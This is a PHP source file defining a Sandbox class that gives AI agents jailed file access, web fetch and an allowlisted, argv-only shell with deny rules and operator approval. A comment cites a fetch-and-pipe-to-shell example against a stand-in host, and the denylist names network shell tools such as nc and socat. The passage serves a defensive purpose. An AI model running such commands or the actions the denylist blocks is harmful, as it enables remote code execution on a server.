<?php
/*
 * Copyright M. Bryce Hudson 2026-2029 All Rights Reserved
 *
 * Unauthorized reproduction, distribution, or transmission of the work is prohibited without prior written permission, with exceptions for brief quotations and specific noncommercial uses under copyright law.
 *
 * BryceFromIndiana@gmail.com
 */

// ============================================
// Sandbox — server-side capabilities for agents
// ============================================
//
// The browser tool harness (ui/js/tools.js) is deliberately powerless: it can
// read the clock and a local notes pad, nothing else. That is the right default
// for code that runs in the page, but it leaves agents without internet access
// or a filesystem, which is most of what a coding agent actually needs.
//
// This class adds the missing powers, and only when they are switched on:
//
//   * web_search — DuckDuckGo HTML endpoints, no API key. Plug in a SearXNG
//     instance instead by setting search_engine to "searxng" + search_url.
//   * fetch      — GET a URL server-side (bypasses browser CORS) and reduce the
//     page to readable text.
//   * read/write/list/glob/grep — a real filesystem, jailed to the directories
//     listed in config.json's "sandbox" block.
//
// Every filesystem call goes through jail(), which resolves the path and
// refuses anything landing outside the allowlist, so ../ and symlink escapes
// cannot reach the rest of the server. Everything is disabled until the
// operator adds allowlist entries, so an unconfigured install exposes nothing.
//
// Config lives in storage/config.json:
//
//   "sandbox": {
//     "read_roots":  ["/var/www/site/router"],
//     "write_roots": ["/var/www/site/router/storage/workspace"],
//     "search_engine": "ddg",
//     "search_url":   "",
//     "max_read_bytes": 200000,
//     "require_token": false,
//     "token": ""
//   }
//

namespace Src;

class Sandbox {
    /** Refuse outbound requests to these; they are the local network, not the internet. */
    const DEFAULT_MAX_READ_BYTES = 200000;
    const MAX_FETCH_BYTES = 3000000;
    const USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36';

    private static function config() {
        $cfg = Config::loadConfig();
        if (!is_array($cfg)) { $cfg = []; }
        $hasSandboxKey = array_key_exists('sandbox', $cfg) && is_array($cfg['sandbox']);
        $sb = $hasSandboxKey ? $cfg['sandbox'] : [];

        $list = function ($key) use ($sb) {
            if (!isset($sb[$key])) { return []; }
            $v = is_array($sb[$key]) ? $sb[$key] : preg_split('/[\r\n,]+/', (string)$sb[$key]);
            $out = [];
            foreach ($v as $item) {
                $item = trim((string)$item);
                if ($item === '') { continue; }
                $real = realpath($item);
                if ($real !== false && is_dir($real)) {
                    $out[] = rtrim(str_replace('\\', '/', $real), '/');
                }
            }
            return array_values(array_unique($out));
        };

        // Default to this app's own directory, so the file tools work on a
        // fresh install instead of reporting themselves as disabled.
        //
        // "No sandbox key at all" and "sandbox key with empty lists" mean
        // different things: the first has never been configured and gets the
        // app dir; the second is somebody who cleared the field on purpose,
        // and gets nothing. Otherwise there would be no way to turn the file
        // tools off.
        $appDir = self::appDir();
        // Shell access widens the default jail to the whole of /var/www, so a
        // fresh install with exec enabled can actually grep the site. An
        // explicit read_roots/write_roots always wins.
        $execOn = !empty($sb['exec_enabled']);
        $wwwRoot = is_dir('/var/www') ? '/var/www' : null;
        $roots = $hasSandboxKey ? $list('read_roots')
            : ($execOn && $wwwRoot ? [$wwwRoot] : ($appDir ? [$appDir] : []));
        $writes = $hasSandboxKey ? $list('write_roots')
            : ($execOn && $wwwRoot ? [$wwwRoot] : ($appDir ? [$appDir] : []));

        // MCP server root: friends' tool calls are jailed to their own scratch
        // directory, and for the per-call scope check to pass that directory
        // must be inside the effective allowlist. It is added HERE (not to the
        // sandbox block) so editing the Working Project Directory never drops
        // it, and so it is not shown as "the" project directory.
        $mcpRoot = trim((string)($cfg['mcp_server']['root'] ?? ''));
        if ($mcpRoot !== '') {
            $real = realpath($mcpRoot);
            if ($real !== false && is_dir($real)) {
                $real = rtrim(str_replace('\\', '/', $real), '/');
                $roots[] = $real;
                $writes[] = $real;
                $roots = array_values(array_unique($roots));
                $writes = array_values(array_unique($writes));
            }
        }

        return [
            'read_roots'  => $roots,
            'write_roots' => $writes,
            // Sensitive paths the file tools refuse even inside a root. Default
            // is filled; an explicit list (even []) replaces it, so the operator
            // can edit or clear it — nothing here is permanent.
            'protect'     => self::protectList($cfg),
            'search_engine' => $sb['search_engine'] ?? 'ddg',
            'search_url'    => $sb['search_url'] ?? '',
            'max_read_bytes' => (int)($sb['max_read_bytes'] ?? self::DEFAULT_MAX_READ_BYTES),
            'require_token' => !empty($sb['require_token']),
            'token'         => (string)($sb['token'] ?? ''),
            // --- shell access -------------------------------------------
            // Off unless the operator turns it on. `exec_enabled` gates the
            // whole feature; `exec_allow` is the per-command allowlist.
            'exec_enabled'  => !empty($sb['exec_enabled']),
            'exec_approval' => !empty($sb['exec_approval']),
            'exec_allow'    => self::execAllowList($sb),
            'exec_deny'     => self::execDenyList($sb),
            // Interpreters allowed to run SCRIPT FILES (never inline code).
            // Empty by default, so a stock install denies them like everything
            // else. Opting one in here narrows it: the inline-code flags are
            // still refused and the script path is still jailed.
            'exec_interpreters' => self::execInterpreters($sb),
            // Outbound routing for the tools. Exposed here because config() is
            // a FLAT map of the sandbox block -- reading it as
            // $cfg['sandbox'][...] silently yields nothing, which is why the
            // tool calls kept going out direct after the relay was routed.
            'proxy_active'    => trim((string)($sb['proxy_active'] ?? '')),
            // Interpreters the operator gave UNRESTRICTED access to: inline code
            // allowed, no script jail. This is the "yes I understand, let it run
            // anything" switch, and it is reversible like every other setting here.
            'exec_interpreters_full' => self::execInterpreters($sb, 'exec_interpreters_full'),
            // Kept so callers can tell "operator pinned a custom list" from
            // "no list configured, defaults in force". Presence of the KEY is
            // the signal, and the defaults are replaced wholesale when set.
            '_sandbox_raw'  => $sb,
            // Code interpreter: runs whole snippets, not allowlisted argv. A
            // separate, off-by-default switch because it is a bigger power
            // than the command allowlist.
            'code_enabled'  => !empty($sb['code_enabled']),
            'code_timeout'  => max(5, min(600, (int)($sb['code_timeout'] ?? 30))),
            'exec_timeout'  => max(5, min(600, (int)($sb['exec_timeout'] ?? 60))),
            'exec_max_bytes'=> max(1024, min(2000000, (int)($sb['exec_max_bytes'] ?? 200000))),
        ];
    }

    /**
     * Commands an agent may run, when shell access is enabled.
     *
     * Read-and-inspect oriented by default: search, read, inspect, and the
     * network probes. Destructive verbs (rm, dd, mkfs, chmod, chown, kill,
     * shutdown, and the shell interpreters themselves) are deliberately absent
     * -- an allowlist is only as good as what it refuses, so the dangerous ones
     * have to be named and added on purpose rather than arriving by default.
     *
     * Note what is NOT here even though it looks harmless: `sh`, `bash`, `zsh`,
     * `python`, `php`, `perl`, `node`. Those hand back a full interpreter and
     * make every other restriction moot, because the allowlist only ever sees
     * argv[0].
     */
    /**
     * Commands that are refused outright, whatever else is true.
     *
     * This is NOT the same as "not on the allowlist". A command missing from
     * the allowlist can be approved one at a time from the UI, and approving it
     * grants that exact argv. A command on THIS list can never be approved at
     * all -- it is checked before both the allowlist and the approval path, so
     * it survives a stale grant, a hand-edited config, or a mistake.
     *
     * Use it for things you never want run from this box even once: the
     * interpreters (which make every other restriction moot, because the
     * allowlist only ever sees argv[0]), the destructive verbs, and anything
     * that reaches outside the jail.
     */
    /**
     * Interpreters granted script-only execution.
     *
     * An interpreter is denied by default because `python3 -c "..."` hides the
     * entire payload inside one argument, where the allowlist, the cwd jail and
     * the path guard cannot see it. That is a real hole, but it is a hole in
     * INLINE code specifically, and refusing `python3 script.py` along with it
     * throws away the ordinary, useful case to fix an unusual one.
     *
     * So opting an interpreter in does not grant it wholesale: inline-code
     * flags stay refused and the script must resolve inside the read roots.
     * `python3 analyse.py` becomes possible; `python3 -c anything` does not.
     */
    private static function execInterpreters($sb, $key = 'exec_interpreters') {
        $list = $sb[$key] ?? [];
        if (!is_array($list)) { return []; }
        return array_values(array_filter(array_map(
            fn($c) => is_scalar($c) ? basename((string)$c) : '', $list), fn($c) => $c !== ''));
    }

    /**
     * Flags that turn an interpreter into an arbitrary-code shell.
     *
     * Keyed per interpreter because the spellings differ. `-` means "read the
     * program from stdin", which is inline code with extra steps.
     */
    private static function interpreterInlineFlags($program) {
        $program = self::policyName($program);
        $common = ['-'];   // stdin, every one of these
        $byProg = [
            'python'  => ['-c'], 'python2' => ['-c'], 'python3' => ['-c'],
            'perl'    => ['-e', '-E'], 'php' => ['-r'],
            'node'    => ['-e', '-p', '--eval', '-i', '--interactive'],
            'ruby'    => ['-e'], 'lua' => ['-e'],
            'sh'      => ['-c'], 'bash' => ['-c'], 'zsh' => ['-c'], 'ksh' => ['-c'],
        ];
        return array_values(array_unique(array_merge(
            $common, $byProg[$program] ?? ['-c', '-e', '-E', '-r'])));
    }

    /**
     * Path rules the file tools always refuse, matched per path segment.
     *
     * Filled by default (secrets: storage/, keys, dotfiles), but an explicit
     * list replaces it — INCLUDING an empty list, which turns protection off.
     * Nothing here is permanent; it is the operator's list to edit.
     */
    private static function protectList($cfg) {
        $default = ['storage', '.git', '.ssh', '.htpasswd', '.htaccess', '.env',
            '*.pem', '*.key', 'id_rsa*', '*.p12', '*.pfx'];
        $list = $cfg['mcp_server']['protect'] ?? ($cfg['sandbox']['protect'] ?? null);
        if (is_array($list)) {
            $out = [];
            foreach ($list as $p) {
                $p = trim((string)$p);
                if ($p !== '') { $out[] = $p; }
            }
            return array_values(array_unique($out));
        }
        return $default;
    }

    /** True when a resolved path hits the protect list. */
    private static function isProtectedPath($path) {
        $protect = self::config()['protect'] ?? [];
        if (!$protect) { return false; }
        $p = str_replace('\\', '/', (string)$path);
        $segments = array_values(array_filter(explode('/', $p), fn($s) => $s !== ''));
        $base = strtolower((string)basename($p));
        foreach ($protect as $rule) {
            $rule = strtolower(trim((string)$rule));
            if ($rule === '') { continue; }
            if (strpos($rule, '*') !== false) {
                if (fnmatch($rule, $base)) { return true; }
                continue;
            }
            foreach ($segments as $s) {
                $sl = strtolower($s);
                if ($sl === $rule) { return true; }
                if ($rule[0] === '.' && strpos($sl, $rule . '.') === 0) { return true; }
            }
        }
        return false;
    }

    private static function execDenyList($sb) {
        $default = [
            // Interpreters and command runners. `sh -c`, `xargs`, and `env`
            // hand back arbitrary execution, so allowlisting them is the same
            // as disabling the allowlist.
            'sh','bash','zsh','ksh','dash','fish','csh','tcsh','ash',
            'python','python2','python3','perl','php','node','ruby','lua','tclsh',
            'env','xargs','eval','exec','find','nc','ncat','socat','telnet',
            // Windows command hosts and script launchers: the local spelling of
            // `sh -c`. Once one of these runs, every other list here is
            // advisory, because the payload sits inside an argument and the
            // host executes it. They belong in the same category as the
            // interpreters above, not in the approval queue where one careless
            // "Always allow" hands back a permanent shell.
            //
            // Nothing here is permanent: this is the DEFAULT list, and an
            // explicit sandbox.exec_deny in storage/config.json REPLACES it
            // wholesale. Delete a name there and it becomes approvable again.
            'cmd','powershell','pwsh','wscript','cscript','mshta',
            'rundll32','regsvr32','msiexec','wmic',
            // Scheduled / service execution outlives the session and the jail,
            // exactly like crontab and at below.
            'schtasks','sc',
            // Registry writes can add a Run key: persistence with no process
            // left to notice.
            'reg','regedit',
            // The desktop shell launches whatever it is handed, so it is a
            // launcher rather than a file manager: `explorer .` is convenient,
            // `explorer thing.exe` is execution.
            'explorer',
            // Reboot / service control
            'shutdown','reboot','halt','poweroff','init','systemctl','service','insmod',
            // Raw device and disk access bypasses the filesystem jail entirely
            'mkfs','fdisk','dd','mount','umount','losetup','mkswap','parted',
            // Privilege and ownership changes
            'chmod','chown','setfacl','chgrp','useradd','userdel','usermod','passwd',
            // Process signalling
            'kill','killall','pkill',
            // Irreversible deletes. `rm` is not an interpreter, so it would
            // otherwise sit in the approval queue where one careless click
            // grants `rm -rf /`. Note the near-misses that stay ALLOWED and
            // will land in the approval queue instead: cp, mv, mkdir, touch,
            // rmdir. Those are recoverable; rm is not.
            'rm','shred','wipefs','unlink',
            // Privilege escalation
            'sudo','su','doas','pkexec','setcap','gdb','strace','ltrace',
            // Scheduled execution, which outlives the session and the jail
            'crontab','at','batch','nohup','setsid','screen','tmux','byobu',
            // Shell metacharacters. They are inert as program names (exec is
            // argv-only and never goes through a shell) but they belong here so
            // a stray one in a hand-edited config is loudly refused rather than
            // silently never matching.
            '&','&&','|','||','>','>>','<','2>',';','`','$(', '$((',
        ];
        // An explicit list REPLACES the default, exactly like exec_allow, so the
        // operator is never quietly running on a partial safety net.
        if (array_key_exists('exec_deny', $sb) && is_array($sb['exec_deny'])) {
            return array_values(array_filter(array_map(
                fn($c) => is_scalar($c) ? (string)$c : '', $sb['exec_deny']), fn($c) => $c !== ''));
        }
        return $default;
    }

    private static function execAllowList($sb) {
        $default = [
            // inspect the box
            'ls', 'pwd', 'cat', 'head', 'tail', 'wc', 'file', 'stat', 'du', 'df',
            // everyday basics. These were missing from early custom lists, so
            // `ls -la` -- the first command anyone runs -- was refused while
            // looking allowlisted. echo/sleep/base64 are coreutils like the
            // rest here, resolved against the safe PATH like everything else.
            'echo', 'sleep', 'base64',
            // Windows-native equivalents. dir/where/more are cmd builtins (or
            // have no Unix twin), while findstr/ipconfig/tasklist are .exe
            // programs shipped with Windows. They are harmless on POSIX hosts
            // where these names simply do not resolve.
            'dir', 'where', 'more', 'findstr', 'ipconfig', 'tasklist',
            // find / env / xargs are intentionally ABSENT: they are permanently on
            // exec_deny, and listing them here would advertise commands that can
            // never run.
            'tree', 'locate', 'which', 'type', 'id', 'whoami', 'uname',
            'uptime', 'date', 'printenv', 'hostname', 'ps', 'lsof',
            // search and transform text
            'grep', 'egrep', 'fgrep', 'rg', 'sed', 'awk', 'sort', 'uniq', 'cut',
            'tr', 'jq', 'diff', 'realpath', 'basename', 'dirname',
            // archives (read paths only; extraction writes, so pair with the cwd jail)
            'tar', 'gzip', 'gunzip', 'zcat', 'unzip', 'sha256sum', 'md5sum',
            // network
            'curl', 'wget', 'nmap', 'ping', 'dig', 'host', 'nslookup', 'whois',
            'netstat', 'ss', 'traceroute', 'tracepath', 'openssl',
        ];
        $custom = [];
        if (isset($sb['exec_allow'])) {
            $v = is_array($sb['exec_allow'])
                ? $sb['exec_allow']
                : preg_split('/[\r\n,]+/', (string)$sb['exec_allow']);
            foreach ((array)$v as $item) {
                $item = basename(trim((string)$item));
                if ($item !== '') { $custom[] = $item; }
            }
        }
        // An explicit list REPLACES the default rather than adding to it, so
        // "allow only these four" is expressible.
        return $custom ? array_values(array_unique($custom)) : $default;
    }

    /** This app's own directory: the parent of src/, resolved. */
    public static function appDir() {
        $dir = realpath(__DIR__ . '/..');
        return $dir === false ? '' : rtrim(str_replace('\\', '/', $dir), '/');
    }

    /** Public view of the sandbox config, with secrets stripped. */
    public static function status() {
        $c = self::config();
        return [
            'ok' => true,
            'enabled' => !empty($c['read_roots']) || !empty($c['write_roots']),
            'read_roots' => $c['read_roots'],
            'write_roots' => $c['write_roots'],
            'app_dir' => self::appDir(),
            'defaulted' => !array_key_exists('sandbox', (array) Config::loadConfig()),
            'search_engine' => $c['search_engine'],
            'search_configured' => !empty($c['read_roots']) || !empty($c['write_roots'])
                || $c['search_engine'] === 'ddg',
            'require_token' => $c['require_token'],
            // --- environment facts (read-only) --------------------------
            // Consumed by the dynamic tool manifest so a model is told which
            // shell it is on and which allowlisted programs actually exist,
            // instead of guessing `findstr` on Linux or `grep` where it is
            // missing. No new privilege: this is the same allowlist config()
            // already resolves.
            'os' => self::isWindows() ? 'windows' : 'posix',
            'os_family' => PHP_OS_FAMILY,
            'exec_enabled' => !empty($c['exec_enabled']),
            'code_enabled' => !empty($c['code_enabled']),
            'exec_allow' => $c['exec_allow'],
            // Desktop programs: cheap summary only (no path resolution, no
            // process lookup) because this is polled by the Config card and by
            // every agent turn's environment header. The full list, with
            // running state, is POST /sandbox/program.
            'programs' => Programs::status(),
            'binaries' => self::binaryAvailability($c['exec_allow'], 40),
        ];
    }

    /**
     * Which allowlisted programs actually resolve on this host. Bounded so a
     * large allowlist is not re-resolved in full on every status call.
     */
    private static function binaryAvailability($names, $cap = 40) {
        $out = [];
        $n = 0;
        foreach ((array) $names as $name) {
            if ($n >= $cap) { break; }
            $name = trim((string) $name);
            if ($name === '') { continue; }
            $out[$name] = self::resolveProgram($name) !== null;
            $n++;
        }
        return $out;
    }

    /**
     * Did this request arrive from the machine this app is running on?
     *
     * Used by the API's front gate to enforce the documented posture of
     * `setup-token.sh --off` ("only do this if the server is unreachable from
     * the internet"): with no token configured there is nothing to check, so a
     * request that came from another machine is refused. Without that, a copy
     * with the gate off behind a web server bound to all interfaces answers
     * anything on the network -- and the API includes a program launcher and the
     * config route that holds this very token.
     *
     * Only two forms count as local: a loopback peer address, and the
     * IPv4-mapped spelling of it that some Windows stacks report. The Host
     * header is deliberately NOT consulted -- it is client-supplied, so a rule
     * like "the Host matched the peer address" would let anyone in by naming
     * their own address in the request. A request through a local reverse proxy
     * passes, because the proxy is what connects; that is the operator's own
     * configuration, not a stranger's.
     */
    public static function isLocalRequest($server = null) {
        $server = is_array($server) ? $server : (array)$_SERVER;
        $remote = trim((string)($server['REMOTE_ADDR'] ?? ''));
        // No peer address at all (the CLI, or PHP's built-in server before it
        // has bound): nothing to refuse, and no network path to refuse it on.
        if ($remote === '') { return true; }
        return in_array(strtolower($remote), ['127.0.0.1', '::1', '::ffff:127.0.0.1'], true);
    }

    /**
     * Gate every sandbox request. Returns an error string, or null when the
     * call may proceed.
     *
     * The API sets Access-Control-Allow-Origin: *, so anyone who can reach this
     * host can POST here. Require-token exists for installs that are publicly
     * reachable; the token is checked against a header the browser sends.
     */
    public static function checkAccess($headers = null) {
        $c = self::config();
        if ($c['require_token'] && $c['token'] !== '') {
            $supplied = '';
            if (is_array($headers)) {
                foreach ($headers as $k => $v) {
                    // Callers pass $_SERVER, which prefixes request headers with
                    // HTTP_ and upper-cases them.
                    //
                    // Accepts X-Router-Token as well as the older
                    // X-Sandbox-Token. These were two separate gates with two
                    // separate header names, so the global one passing did not
                    // mean this one passed: a correct X-Router-Token was still
                    // rejected here as "bad or missing token". One token, both
                    // gates.
                    $k = strtolower((string)$k);
                    if (in_array($k, [
                        'x-sandbox-token', 'http_x_sandbox_token',
                        'x-router-token', 'http_x_router_token',
                    ], true)) {
                        $supplied = (string)$v;
                    }
                }
            } elseif ($headers) {
                $supplied = (string)$headers;
            }
            if (!hash_equals($c['token'], $supplied)) {
                return 'sandbox: bad or missing token';
            }
        }
        return null;
    }

    // ---------------------------------------------------------------
    // Shell execution
    // ---------------------------------------------------------------

    /**
     * Run one command on behalf of an agent.
     *
     * The decisive design choice: the command arrives as an ARRAY of arguments
     * and is executed with proc_open() WITHOUT a shell. That makes `;`, `&&`,
     * `|`, backticks and `$(...)` inert -- they are not special, because there
     * is no shell to give them meaning. A model that emits
     * ["grep","-rn","x","."] gets grep. A model that emits
     * ["sh","-c","curl evil.sh|sh"] is refused, because `sh` is not on the
     * allowlist and because argv[0] is the only thing the allowlist sees.
     *
     * A shell-string API would be trivially escaped by a model that has read
     * any untrusted text it fetched, which is exactly what these agents do.
     *
     * @param array $argv   [program, arg, arg...]
     * @param array $opts   {cwd, timeout, max_bytes, stdin}
     * @return array {ok, exit, stdout, stderr, truncated, timed_out, ms}
     */
    public static function execCommand($argv, $opts = []) {
        $cfg = self::config();
        if (!$cfg['exec_enabled']) {
            return ['ok' => false, 'exit' => -1, 'stdout' => '', 'stderr' =>
                'Shell access is disabled. Enable "Shell access" in the Config tab '
                . '(storage/config.json -> sandbox.exec_enabled) to let agents run commands.',
                'truncated' => false, 'timed_out' => false, 'ms' => 0];
        }

        $argv = array_values(array_filter(array_map(
            fn($a) => is_scalar($a) ? (string)$a : '', (array)$argv), fn($a) => $a !== ''));
        if (!$argv) {
            return ['ok' => false, 'exit' => -1, 'stdout' => '', 'stderr' => 'No command given.',
                'truncated' => false, 'timed_out' => false, 'ms' => 0];
        }

        $program = basename($argv[0]);

        // An interpreter the operator opted in runs SCRIPT FILES only, and is
        // checked before the absolute denylist so that opting in is what makes
        // it reachable at all. Inline code stays refused either way.
        // Unrestricted access: the operator explicitly chose it. No flag
        // inspection, no script jail -- `python3 -c "anything"` runs, which is
        // the same power as a shell. Still subject to the cwd jail, the path
        // guard and the timeout, and it must be in the allowlist like anything
        // else, so it stays a deliberate, visible, reversible setting.
        $fullInterpreter = self::inPolicyList($program, $cfg['exec_interpreters_full']);

        $scriptedInterpreter = false;
        if (!$fullInterpreter && self::inPolicyList($program, $cfg['exec_interpreters'])) {
            $scriptedInterpreter = true;
            $inline = self::interpreterInlineFlags($program);
            $script = null;
            $scriptIndex = null;
            foreach (array_slice($argv, 1, null, true) as $i => $a) {
                if ($a === '' ) { continue; }
                if ($a[0] === '-') {
                    if (in_array($a, $inline, true)) {
                        return ['ok' => false, 'exit' => -1, 'stdout' => '',
                            'stderr' => "Refused: \"$a\" runs code supplied on the command line, which "
                                . 'the sandbox cannot inspect. "' . $program . '" may run script files '
                                . 'that live inside the allowed directories.',
                            'denied' => true, 'truncated' => false, 'timed_out' => false, 'ms' => 0];
                    }
                    continue;
                }
                $script = $a;
                $scriptIndex = $i;
                break;
            }
            if ($script === null) {
                return ['ok' => false, 'exit' => -1, 'stdout' => '',
                    'stderr' => "Refused: \"$program\" with no script would read from stdin and hang. "
                        . 'Give it a file inside the allowed directories.',
                    'denied' => true, 'truncated' => false, 'timed_out' => false, 'ms' => 0];
            }
            // The script itself must sit inside the jail, exactly like any other
            // path argument. This is the part that makes opting in meaningful.
            $cwdForScript = self::appDir() ?: '/tmp';
            if (!empty($opts['cwd'])) {
                try {
                    $cwdForScript = self::jail($opts['cwd'], self::writeRoots(), 'exec cwd');
                } catch (\RuntimeException $e) {
                    return ['ok' => false, 'exit' => -1, 'stdout' => '', 'stderr' => $e->getMessage(),
                        'truncated' => false, 'timed_out' => false, 'ms' => 0];
                }
            }
            $resolved = self::resolveExisting(
                $script[0] === '/' ? $script : $cwdForScript . '/' . $script);
            $allowedRoots = array_merge(self::readRoots(), self::writeRoots());
            $inside = false;
            foreach ($allowedRoots as $r) {
                if ($resolved !== null && ($resolved === $r || strpos($resolved, $r . '/') === 0)) {
                    $inside = true; break;
                }
            }
            if (!$inside) {
                return ['ok' => false, 'exit' => -1, 'stdout' => '',
                    'stderr' => 'Refused: script "' . $script . '" resolves to '
                        . ($resolved === null ? 'nothing that exists' : $resolved)
                        . ', which is outside the allowed directories ('
                        . implode(', ', $allowedRoots) . ').',
                    'denied' => true, 'truncated' => false, 'timed_out' => false, 'ms' => 0];
            }
            // Rebuild argv with the script replaced by its RESOLVED path, and
            // keep everything that came after it. Dropping the tail silently
            // stripped the script's own arguments -- `bash run.sh --verbose`
            // reached the script with $1, $2 and $3 all empty, which looks
            // like the script being broken rather than the argv being mangled.
            $rebuilt = [$argv[0], $resolved];
            for ($i = $scriptIndex + 1; $i < count($argv); $i++) {
                $rebuilt[] = $argv[$i];
            }
            $argv = $rebuilt;
            $program = basename($argv[0]);
            // Already validated above (script inside the jail, no inline code),
            // so it skips the allowlist and approval path entirely.
        } elseif (!$fullInterpreter && self::inPolicyList($program, $cfg['exec_deny'])) {
            // The denylist wins over the allowlist and over approvals: checked
            // here, before either, so a past "Always allow" cannot reach around
            // it. That is the whole point of it. It is NOT permanent, though --
            // the list is config the operator owns, so the refusal says exactly
            // how to take the name back off it. Whoever reads this message (often
            // a model relaying it to the person who can edit it) needs the undo
            // path in the text, not a rule number they would have to look up.
            return ['ok' => false, 'exit' => -1, 'stdout' => '',
                'stderr' => "Refused: \"$program\" is on the shell denylist, which is checked "
                    . 'before approvals, so "Always allow" cannot override it. The list is yours, '
                    . "not a rule in code: delete the \"$program\" line under "
                    . 'Config → Shell access → Allow / Deny (section 4), add it to section 2, '
                    . 'and it runs like any other command.',
                'denied' => true, 'truncated' => false, 'timed_out' => false, 'ms' => 0];
        }

        // A scripted interpreter was already fully validated above (jailed
        // script, no inline code), so it does not ALSO have to appear in the
        // command allowlist -- opting in via exec_interpreters is the grant.
        // Both interpreter levels are already explicit opt-ins, so neither ALSO
        // needs to appear in the command allowlist -- otherwise "Full access"
        // would still ask for approval, which contradicts what it says.
        // Everything else (cwd jail, path guard, timeout, audit log) still applies.
        if (!$scriptedInterpreter && !$fullInterpreter
            && !self::inPolicyList($program, $cfg['exec_allow']) && !self::alreadyGranted($argv)) {
            // Operator approval is on: ask, rather than refusing outright.
            if (!empty($cfg['exec_approval'])) {
                $id = self::requestApproval($argv, $cwd ?? null, $opts['agent'] ?? '');
                return ['ok' => false, 'exit' => -1, 'stdout' => '',
                    'stderr' => "Waiting for your approval: \"" . $program . "\" is not on the allowlist. "
                        . 'Approve it in the approval prompt (Allow once / Always allow) or under '
                        . 'Config \u2192 Shell access \u2192 Pending approvals, then have the agent '
                        . 'run the command again.',
                    'pending' => $id, 'argv' => $argv,
                    'truncated' => false, 'timed_out' => false, 'ms' => 0];
            }
            return ['ok' => false, 'exit' => -1, 'stdout' => '',
                'stderr' => "Command \"$program\" is not allowed. "
                    . 'Allowed: ' . implode(', ', $cfg['exec_allow'])
                    . ' | Turn on "Ask before running new commands" in the Config tab to approve '
                    . 'these one at a time.',
                'truncated' => false, 'timed_out' => false, 'ms' => 0];
        }

        // The working directory is jailed exactly like a file path. Without
        // this, `find /` or `cat /etc/shadow` works from any directory.
        //
        // Default to an ALLOWED root, not appDir(): when the configured roots
        // do not include the app folder (the normal case for a deployed agent
        // sandbox), appDir was outside the jail, so every relative argument
        // looked like an escape and `cat local-IPs.txt` was refused with
        // "outside the allowed directories". Exec may run in a read-only root;
        // writing is not required to list or read.
        $execRoots = array_values(array_unique(array_merge(self::readRoots(), self::writeRoots())));
        $defaultCwd = $execRoots ? $execRoots[0] : (self::appDir() ?: sys_get_temp_dir());
        $cwd = $defaultCwd;
        if (!empty($opts['cwd'])) {
            try {
                $cwd = self::jail($opts['cwd'], $execRoots ?: [self::appDir() ?: sys_get_temp_dir()], 'exec cwd');
            } catch (\RuntimeException $e) {
                return ['ok' => false, 'exit' => -1, 'stdout' => '', 'stderr' => $e->getMessage(),
                    'truncated' => false, 'timed_out' => false, 'ms' => 0];
            }
        }

        // Jailing the CWD is not enough. `cat /etc/shadow` runs happily from a
        // jailed directory because the PATH is an ARGUMENT, and argv-based
        // execution gives no shell to stop it. So for the commands that take
        // paths, every argument that looks like one is checked against the same
        // roots the file tools use.
        //
        // This is defence in depth, not a boundary: it is a blocklist keyed on
        // per-command argument positions, so an unexpected combination could
        // slip through. The real boundary is the allowlist plus the privilege
        // the web server runs as.
        $escape = self::checkArgPaths($argv, $program, self::readRoots(), self::writeRoots(), $cwd);
        if ($escape !== null) {
            return ['ok' => false, 'exit' => -1, 'stdout' => '',
                'stderr' => 'Refused: ' . $escape
                    . ' Arguments that are paths must stay inside the allowed directories ('
                    . implode(', ', self::readRoots()) . ').',
                'truncated' => false, 'timed_out' => false, 'ms' => 0];
        }
        if (!is_dir($cwd)) { $cwd = $defaultCwd; }

        $timeout = isset($opts['timeout'])
            ? max(1, min(600, (int)$opts['timeout'])) : $cfg['exec_timeout'];
        $maxBytes = isset($opts['max_bytes'])
            ? max(1024, min(2000000, (int)$opts['max_bytes'])) : $cfg['exec_max_bytes'];

        // Windows shell builtins should stay Windows-shaped. Git for Windows
        // ships pwd.exe/which.exe/echo.exe, but pwd prints an MSYS path such as
        // /c/Users/... and which prints /c/Windows/..., which the model cannot
        // use as a Windows path. Prefer the PHP implementations for these.
        if (self::isWindows()
            && in_array($program, ['echo', 'pwd', 'which', 'where', 'type', 'dir', 'mkdir', 'sleep', 'more'], true)) {
            $builtin = self::runBuiltin($argv, $cwd, $opts, $timeout, $maxBytes);
            if ($builtin !== null) { return $builtin; }
        }

        // Resolve the program against a PATH of known-good directories, and
        // confirm it is a real executable file. `exec_allow` matches on NAME,
        // so without this a writable directory earlier in PATH could shadow
        // grep with something else.
        $resolved = self::resolveProgram($program);
        if ($resolved === null) {
            // Windows has no echo.exe/type.exe/pwd.exe; they are shell builtins.
            // Handle the harmless ones here rather than starting cmd.exe.
            $builtin = self::runBuiltin($argv, $cwd, $opts, $timeout, $maxBytes);
            if ($builtin !== null) { return $builtin; }
            return ['ok' => false, 'exit' => -1, 'stdout' => '',
                'stderr' => "Command \"$program\" is not installed or not executable on this host."
                    . (self::isWindows()
                        ? ' On Windows, install Git for Windows (for ls, cat, grep, sed, awk) '
                          . 'or use a Windows .exe. Shell built-ins echo, pwd, type, which and '
                          . 'sleep are handled internally.'
                        : ''),
                'truncated' => false, 'timed_out' => false, 'ms' => 0];
        }
        $argv[0] = $resolved;

        // A deliberately small environment. Inheriting the web server's
        // environment would hand the agent anything the master process has.
        $env = self::execEnvironment($cwd);

        // Route the command's own network traffic through the selected proxy.
        // curl, wget, nmap and friends all read these, so without them an
        // agent running `curl ifconfig.me` reported this server's real address
        // while its model calls were going through the proxy.
        $activeProxy = self::activeProxy();
        if ($activeProxy !== '') {
            $env['http_proxy'] = $activeProxy;
            $env['https_proxy'] = $activeProxy;
            $env['HTTP_PROXY'] = $activeProxy;
            $env['HTTPS_PROXY'] = $activeProxy;
            // curl honours ALL_PROXY for anything not http(s); nmap needs it
            // told explicitly or it scans straight from this host.
            $env['ALL_PROXY'] = $activeProxy;
            $env['all_proxy'] = $activeProxy;
            $env['NO_PROXY'] = 'localhost,127.0.0.1,::1';
            $env['no_proxy'] = 'localhost,127.0.0.1,::1';
        }

        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w'],
        ];
        $t0 = microtime(true);
        // Audited BEFORE the spawn. If this request dies while the command is
        // still running -- a GUI app that stays open, a force-stopped turn, a
        // server restart -- this line is already on disk, so the run shows up
        // as started-and-never-finished instead of leaving no trace at all.
        $runId = substr(bin2hex(random_bytes(6)), 0, 12);
        self::audit($program, $argv, $cwd, null, null, [
            'run' => $runId, 'phase' => 'start', 'kind' => 'exec',
            'agent' => (string)($opts['agent'] ?? ''),
        ]);
